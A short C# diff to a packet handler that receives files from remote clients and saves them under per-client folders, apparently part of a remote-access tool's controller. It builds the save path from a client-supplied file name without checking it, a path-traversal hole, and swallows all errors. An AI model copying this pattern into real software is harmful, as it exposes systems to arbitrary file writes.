@@ -172,20 +172,24 @@ namespace Server.Handle_Packet
                             {
                                 Program.form1.BeginInvoke((MethodInvoker)(async () =>
                                 {
-                                    string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
-                                    FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
-                                    if (SD != null)
+                                    try
                                     {
-                                        if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", ""))))
-                                            return;
-                                        string filename = Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString);
-                                        if (File.Exists(filename))
+                                        string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
+                                        FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
+                                        if (SD != null)
                                         {
-                                            File.Delete(filename);
-                                            await Task.Delay(500);
+                                            if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", ""))))
+                                                return;
+                                            string filename = Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString);
+                                            if (File.Exists(filename))
+                                            {
+                                                File.Delete(filename);
+                                                await Task.Delay(500);
+                                            }
+                                            await unpack_msgpack.ForcePathObject("File").SaveBytesToFile(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString));
                                         }
-                                        File.WriteAllBytes(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString), unpack_msgpack.ForcePathObject("File").GetAsBytes());
                                     }
+                                    catch { }
                                 }));
                             }
                             break;
